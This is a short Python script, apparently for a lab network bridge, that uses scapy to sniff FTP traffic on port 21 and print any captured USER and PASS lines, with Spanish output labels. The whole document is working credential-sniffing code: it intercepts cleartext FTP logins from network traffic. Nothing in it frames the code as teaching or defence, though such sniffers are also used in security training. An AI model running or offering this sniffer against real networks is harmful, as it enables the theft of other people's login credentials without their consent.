
from scapy.all import sniff, TCP, Raw

def print_pkt(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        data = pkt[Raw].load.decode(errors='ignore')
        if "USER" in data:
            print(f"[+] Usuario detectado: {data.strip()}")
        elif "PASS" in data:
            print(f"[+] Contraseña detectada: {data.strip()}")
        elif pkt[TCP].sport == 21 or pkt[TCP].dport == 21:
            print(f"[FTP] {data.strip()}")

sniff(iface="br-XXXX", filter="tcp port 21", prn=print_pkt, store=False)


